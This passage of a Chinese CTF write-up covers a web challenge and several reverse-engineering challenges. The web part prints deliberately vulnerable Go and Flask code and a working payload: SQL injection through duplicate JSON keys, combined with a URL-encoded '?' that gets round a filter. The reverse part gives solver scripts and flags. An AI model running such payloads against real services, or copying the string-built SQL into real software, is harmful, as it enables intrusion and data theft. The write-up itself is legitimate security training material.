class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">db <span class="string">&quot;ctf/database&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Language <span class="keyword">struct</span> &#123;</span><br><span class="line">Id  <span class="keyword">int32</span>  <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">Name <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">Votes <span class="keyword">int64</span> <span class="string">`json:&quot;votes&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">ok(w, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">List</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">rows, err := db.Sqlite.Query(<span class="string">&quot;SELECT * FROM languages;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line">votes, err := jsonparser.GetInt(reqBody, <span class="string">&quot;votes&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading votes&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name, err := jsonparser.GetString(reqBody, <span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading name&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;</span>, votes, name)</span><br><span class="line">rows, err := db.Sqlite.Query(query)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flag</span><span class="params">(w http.ResponseWriter, r *http.Request )</span></span> &#123;</span><br><span class="line">action:= r.URL.Query().Get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting action&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token:= r.URL.Query().Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> secret <span class="keyword">string</span></span><br><span class="line">row := db.Sqlite.QueryRow(<span class="string">&quot;SELECT secret FROM token;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := row.Scan(&amp;secret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error querying secret token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> &amp;&amp; secret == token &#123;</span><br><span class="line">data, err := ioutil.ReadFile(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading flag&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, fmt.Sprintf(<span class="string">&quot;Congrats this is your flag: %s&quot;</span>, <span class="keyword">string</span>(data)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, <span class="string">&quot;Wrong token&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路由 <code>/flag</code> 中GET两个参数 <code>?action=readFlag&amp;token=xxxxx</code>，token正确得flag，而路由 <code>/search</code> 中容易通过SQL注入拿到token。</p><p>python服务中 <code>app.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;127.0.0.1:8000&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/list&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listAll</span>():</span></span><br><span class="line">    r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/list&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/search&quot;</span>, data=request.data)</span><br><span class="line">        <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/healthcheck&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">healthCheck</span>():</span></span><br><span class="line">    getPath = [<span class="string">&quot;&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    postPath = [<span class="string">&quot;api/list&quot;</span>, <span class="string">&quot;api/search&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> getPath:</span><br><span class="line">            requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> postPath:</span><br><span class="line">            requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Down&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> unquote(path):</span><br><span class="line">        action = request.args.get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        token = request.args.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(action)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: action,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>发现其中存在两个点需要绕过：</p><ol><li>路由 <code>/search</code> 中JSON严格过滤，<code>name</code> 的值必须满足 <code>isalnum()</code>，<code>votes</code> 的值必须为数字，避免SQL注入情况；</li><li>检测url里使用GET方法传入 <code>action=readFlag</code> 会直接拒绝。</li></ol><p>对于第1点，尝试构造含两个 <code>name</code> 参数的JSON，在python中认JSON中第二个 <code>name</code>，而go中认JSON中第一个 <code>name</code>，利用这种差异构造：<code>&#123;&quot;votes&quot;:1,&quot;name&quot;:&quot;-1&#39; union select 1,secret,3 from token --+&quot;,&quot;name&quot;:[]&#125;</code>，绕过得到token值，得到 <code>re@l1y_4th_T0k3n</code>。</p><p>对于第2点，利用 <code>@app.route(&quot;/&lt;path:path&gt;&quot;)</code> 特性，对 <code>?</code> 进行url编码可以在python层面绕过GET参数识别，即 <code>action = request.args.get(&#39;action&#39;)</code> 不会获取到内容，payload：<code>/flag%3faction=readFlag&amp;token=re@l1y_4th_T0k3n</code>。</p><p>得到flag：<code>&quot;&#123;\&quot;msg\&quot;:\&quot;Congrats this is your flag: flag&#123;73c468d2-582e-4fdf-8be9-72efe6cbb9a2&#125;\\n\&quot;&#125;\n&quot;</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="hiahia-o-▽-┛"><a href="#hiahia-o-▽-┛" class="headerlink" title="hiahia o(*^▽^*)┛"></a>hiahia o(*^▽^*)┛</h3><p>IDA查看伪码，无逆向，照着实现就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">list</span>(<span class="string">b&#x27;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>(<span class="params">c,k</span>):</span></span><br><span class="line">    <span class="keyword">if</span> k&gt;<span class="number">9</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">11</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">13</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">5</span></span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t+=<span class="built_in">chr</span>(flag(s[i],i))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># flag&#123;RrrrEe33202111&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h3><p>jadx查看MainActivity主逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">String trim = <span class="keyword">this</span>.input.getText().toString().trim();</span><br><span class="line"><span class="keyword">int</span>[] iArr = &#123;<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="keyword">int</span>[] iArr2 = &#123;<span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (trim.length() != <span class="number">18</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.input.setText(<span class="string">&quot;FLAG错误&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span>[] charArray = trim.toCharArray();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">iArr2[i] = i % <span class="number">2</span> == <span class="number">0</span> ? charArray[i] ^ i : charArray[i] ^ charArray[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">String str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">18</span>; i2++) &#123;</span><br><span class="line">str = str.concat(Integer.toHexString(iArr2[i2])).concat(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(str);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i3 = <span class="number">0</span>; i3 &lt; <span class="number">18</span>; i3++) &#123;</span><br><span class="line"><span class="keyword">if</span> (iArr2[i3] != iArr[i3]) &#123;</span><br><span class="line"><span class="keyword">this</span>.input.setText(<span class="string">&quot;FLAG错误！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.input.setText(<span class="string">&quot;FLAG正确&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=[BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">7</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line">out=[<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>]</span><br><span class="line"></span><br><span class="line">s=[<span class="number">42</span>]*<span class="number">19</span></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        s[i]=flag[i]^i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s[i]=flag[i]^flag[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    ss.add(s[i]==out[i])</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    res+=(<span class="built_in">chr</span>(m[flag[i]].as_long()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># flag&#123;Reverse__APP</span></span><br></pre></td></tr></table></figure><p>加花括号闭合，得到flag：flag{Reverse__APP}</p><p>​    </p><h3 id="WAY"><a href="#WAY" class="headerlink" title="WAY"></a>WAY</h3><blockquote><p>flag{md5(result)}</p></blockquote><p>检测带upx壳，脱壳后IDA查看伪码，迷宫题，wsad代表上下左右，提取迷宫数组得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OIIII</span><br><span class="line">OOIO#</span><br><span class="line">IOOOI</span><br><span class="line">IOIOI</span><br><span class="line">IIIII</span><br></pre></td></tr></table></figure><p>容易得到路径：sdsddwd，MD5得到flag：flag{6654b3343f6f3f6223a721e7f65e87f8}</p><p>​    </p><h3 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h3><p>Sparc架构，IDA无法反编译为伪码，用Ghidra得到伪码主逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  longlong unaff_g7;</span><br><span class="line">  <span class="keyword">int</span> local_res7d3;</span><br><span class="line">  undefined8 local_res7d7;</span><br><span class="line">  undefined8 local_res7df;</span><br><span class="line">  undefined8 local_res7e7;</span><br><span class="line">  undefined8 local_res7ef;</span><br><span class="line">  longlong local_res7f7;</span><br><span class="line">  </span><br><span class="line">  local_res7f7 = *(longlong *)(unaff_g7 + <span class="number">0x28</span>);</span><br><span class="line">  local_res7d7 = <span class="number">0</span>;</span><br><span class="line">  local_res7df = <span class="number">0</span>;</span><br><span class="line">  local_res7e7 = <span class="number">0x37463f3044413243</span>;</span><br><span class="line">  local_res7ef = <span class="number">0x3429000000000000</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input_sparkle_flag_here:\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,&amp;local_res7d7,<span class="number">0xc</span>);</span><br><span class="line">  local_res7d3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> &lt; local_res7d3) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good_job!&quot;</span>);</span><br><span class="line">LAB_001008a0:</span><br><span class="line">      <span class="keyword">if</span> (local_res7f7 == *(longlong *)(unaff_g7 + <span class="number">0x28</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      __stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) =</span><br><span class="line">         *(<span class="keyword">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) + <span class="number">-0x2f</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) !=</span><br><span class="line">        *(<span 